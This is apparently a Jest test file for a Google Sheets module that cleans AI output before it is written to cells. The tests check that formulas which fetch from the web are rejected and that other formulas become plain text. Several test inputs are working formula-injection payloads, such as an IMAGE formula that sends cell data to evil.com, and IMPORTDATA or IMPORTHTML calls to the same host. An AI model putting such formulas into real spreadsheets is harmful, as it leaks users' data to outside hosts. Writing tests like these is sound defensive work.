/**
 * Tests for src/server/safe-writes.ts — the only sanctioned path for writing
 * untrusted-origin content to a Sheets cell. See T6 in the threat model.
 */

function makeRichTextBuilder() {
  let builtText = "";
  const builder = {
    setText: (t: string) => {
      builtText = t;
      return builder;
    },
    build: () => ({ getText: () => builtText }) as GoogleAppsScript.Spreadsheet.RichTextValue,
  };
  return builder;
}

(globalThis as unknown as { SpreadsheetApp: unknown }).SpreadsheetApp = {
  newRichTextValue: () => makeRichTextBuilder(),
};

import {
  sanitizeForCell,
  writeSafeValue,
  writeSafeValueGrid,
  writeSafeRichText,
  writeSafeRichTextGrid,
  writeColumn,
} from "../src/server/safe-writes";

describe("sanitizeForCell", () => {
  const REJECTION_MSG =
    "[SSI Error: AI response contained an external request formula — output rejected]";

  it("rejects =IMAGE formula (exfiltrates cell data via image URL)", () => {
    expect(sanitizeForCell('=IMAGE("https://evil.com/?d="&A1)')).toBe(REJECTION_MSG);
  });

  it("rejects +IMPORTDATA formula (fetches external URL via + prefix)", () => {
    expect(sanitizeForCell("+IMPORTDATA(A1)")).toBe(REJECTION_MSG);
  });

  it("rejects -IMPORTXML formula", () => {
    expect(sanitizeForCell('-IMPORTXML(A1, "//b")')).toBe(REJECTION_MSG);
  });

  it("rejects =IMPORTHTML formula", () => {
    expect(sanitizeForCell('=IMPORTHTML("http://evil.com", "table", 1)')).toBe(REJECTION_MSG);
  });

  it("rejects =IMPORTRANGE formula", () => {
    expect(sanitizeForCell('=IMPORTRANGE("spreadsheetId", "A1:A10")')).toBe(REJECTION_MSG);
  });

  it("rejects =IMPORTFEED formula", () => {
    expect(sanitizeForCell('=IMPORTFEED("http://evil.com/rss")')).toBe(REJECTION_MSG);
  });

  it("rejects web-fetch function nested inside another formula", () => {
    expect(sanitizeForCell('=IF(1=1,IMAGE("evil.com"),0)')).toBe(REJECTION_MSG);
  });

  it("rejects web-fetch function nested inside IFERROR", () => {
    expect(sanitizeForCell('=IFERROR(IMPORTDATA("http://evil.com"),0)')).toBe(REJECTION_MSG);
  });

  it("rejects web-fetch function name regardless of case", () => {
    expect(sanitizeForCell('=image("evil.com")')).toBe(REJECTION_MSG);
  });

  it("prepends apostrophe to non-web-fetch formula starting with =", () => {
    expect(sanitizeForCell("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
  });

  it("prepends apostrophe to non-web-fetch formula starting with - (defense-in-depth)", () => {
    expect(sanitizeForCell("-SUM(A1:A10)")).toBe("'-SUM(A1:A10)");
  });

  it("prepends apostrophe to non-web-fetch formula starting with +", () => {
    expect(sanitizeForCell("+SUM(A1:A10)")).toBe("'+SUM(A1:A10)");
  });

  it("leaves normal AI response text unchanged", () => {
    expect(sanitizeForCell("The subject appeared in three court filings.")).toBe(
      "The subject appeared in three court filings.",
    );
  });

  it("leaves empty string unchanged", () => {
    expect(sanitizeForCell("")).toBe("");
  });

  it("leaves values with leading whitespace unchanged (Sheets does not evaluate as formula)", () => {
    expect(sanitizeForCell("  =not evaluated as formula")).toBe("  =not evaluated as formula");
  });

  it("preserves the full response when prepending apostrophe to a safe multiline formula", () => {
    const input = "=SUM(A1:A10)\nNote: this formula sums the range";
    expect(sanitizeForCell(input)).toBe(`'${input}`);
  });
});

describe("writeSafeValue", () => {
  it("writes a safe string value to the range unchanged", () => {
    const setValueMock = jest.fn();
    const range = { setValue: setValueMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValue(range, "hello");
    expect(setValueMock).toHaveBeenCalledWith("hello");
  });

  it("rejects a web-fetch formula", () => {
    const setValueMock = jest.fn();
    const range = { setValue: setValueMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValue(range, '=IMAGE("evil.com")');
    expect(setValueMock).toHaveBeenCalledWith(
      "[SSI Error: AI response contained an external request formula — output rejected]",
    );
  });

  it("literal-izes a non-web-fetch formula", () => {
    const setValueMock = jest.fn();
    const range = { setValue: setValueMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValue(range, "=SUM(A1:A10)");
    expect(setValueMock).toHaveBeenCalledWith("'=SUM(A1:A10)");
  });

  it("passes non-string values through unchanged (numbers can never be a sheet function)", () => {
    const setValueMock = jest.fn();
    const range = { setValue: setValueMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValue(range, 42);
    expect(setValueMock).toHaveBeenCalledWith(42);
  });
});

describe("writeSafeValueGrid", () => {
  it("sanitizes every string cell and writes the whole grid in one setValues call", () => {
    const setValuesMock = jest.fn();
    const range = { setValues: setValuesMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValueGrid(range, [
      ["safe text", '=IMAGE("evil.com")'],
      ["=SUM(A1:A10)", "more text"],
    ]);
    expect(setValuesMock).toHaveBeenCalledTimes(1);
    expect(setValuesMock).toHaveBeenCalledWith([
      [
        "safe text",
        "[SSI Error: AI response contained an external request formula — output rejected]",
      ],
      ["'=SUM(A1:A10)", "more text"],
    ]);
  });

  it("passes non-string cells (numbers, booleans, dates) through unchanged", () => {
    const setValuesMock = jest.fn();
    const range = { setValues: setValuesMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    const date = new Date(2026, 0, 1);
    writeSafeValueGrid(range, [[42, true, date]]);
    expect(setValuesMock).toHaveBeenCalledWith([[42, true, date]]);
  });
});

function makeRichTextValue(text: string): GoogleAppsScript.Spreadsheet.RichTextValue {
  return { getText: () => text } as unknown as GoogleAppsScript.Spreadsheet.RichTextValue;
}

describe("writeSafeRichText", () => {
  it("writes the original RichTextValue unchanged when the flattened text is safe", () => {
    const setRichTextValueMock = jest.fn();
    const range = {
      setRichTextValue: setRichTextValueMock,
    } as unknown as GoogleAppsScript.Spreadsheet.Range;
    const richTextValue = makeRichTextValue("**bold** safe text");
    writeSafeRichText(range, richTextValue);
    expect(setRichTextValueMock).toHaveBeenCalledWith(richTextValue);
  });

  it("drops formatting and rejects when the flattened text is a web-fetch formula", () => {
    const setRichTextValueMock = jest.fn();
    const range = {
      setRichTextValue: setRichTextValueMock,
    } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeRichText(range, makeRichTextValue('=IMPORTDATA("evil.com")'));
    const written = setRichTextValueMock.mock
      .calls[0][0] as GoogleAppsScript.Spreadsheet.RichTextValue;
    expect(written.getText()).toBe(
      "[SSI Error: AI response contained an external request formula — output rejected]",
    );
  });

  it("drops formatting and literal-izes when the flattened text is a benign formula", () => {
    const setRichTextValueMock = jest.fn();
    const range = {
      setRichTextValue: setRichTextValueMock,
    } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeRichText(range, makeRichTextValue("=SUM(A1:A10)"));
    const written = setRichTextValueMock.mock
      .calls[0][0] as GoogleAppsScript.Spreadsheet.RichTextValue;
    expect(written.getText()).toBe("'=SUM(A1:A10)");
  });
});

describe("writeSafeRichTextGrid", () => {
  it("sanitizes every cell in the grid via a single setRichTextValues call", () => {
    const setRichTextValuesMock = jest.fn();
    const range = {
      setRichTextValues: setRichTextValuesMock,
    } as unknown as GoogleAppsScript.Spreadsheet.Range;
    const safeCell = makeRichTextValue("safe text");
    const dangerousCell = makeRichTextValue('=IMAGE("evil.com")');
    writeSafeRichTextGrid(range, [[safeCell, dangerousCell]]);
    expect(setRichTextValuesMock).toHaveBeenCalledTimes(1);
    const [[writtenSafe, writtenDangerous]] = setRichTextValuesMock.mock
      .calls[0][0] as GoogleAppsScript.Spreadsheet.RichTextValue[][];
    expect(writtenSafe).toBe(safeCell);
    expect(writtenDangerous.getText()).toBe(
      "[SSI Error: AI response contained an external request formula — output rejected]",
    );
  });
});

describe("writeColumn", () => {
  it("writes values starting at row 2 using a single setValues call", () => {
    const setValuesMock = jest.fn();
    const sheet = {
      getRange: jest.fn().mockReturnValue({ setValues: setValuesMock }),
    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
    writeColumn(sheet, 3, ["a", "b", "c"]);
    expect(sheet.getRange).toHaveBeenCalledWith(2, 3, 3, 1);
    expect(setValuesMock).toHaveBeenCalledWith([["a"], ["b"], ["c"]]);
  });

  it("does nothing when values array is empty", () => {
    const sheet = {
      getRange: jest.fn(),
    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
    writeColumn(sheet, 1, []);
    expect(sheet.getRange).not.toHaveBeenCalled();
  });

  it("applies wrapStrategy to the written range when provided", () => {
    const setValuesMock = jest.fn();
    const setWrapStrategyMock = jest.fn();
    const sheet = {
      getRange: jest
        .fn()
        .mockReturnValue({ setValues: setValuesMock, setWrapStrategy: setWrapStrategyMock }),
    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
    const wrapStrategy = "CLIP" as unknown as GoogleAppsScript.Spreadsheet.WrapStrategy;
    writeColumn(sheet, 3, ["a", "b"], wrapStrategy);
    expect(setWrapStrategyMock).toHaveBeenCalledWith(wrapStrategy);
  });

  it("sanitizes a dangerous value before writing", () => {
    const setValuesMock = jest.fn();
    const sheet = {
      getRange: jest.fn().mockReturnValue({ setValues: setValuesMock }),
    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
    writeColumn(sheet, 3, ['=IMAGE("evil.com")', "safe"]);
    expect(setValuesMock).toHaveBeenCalledWith([
      ["[SSI Error: AI response contained an external request formula — output rejected]"],
      ["safe"],
    ]);
  });
});
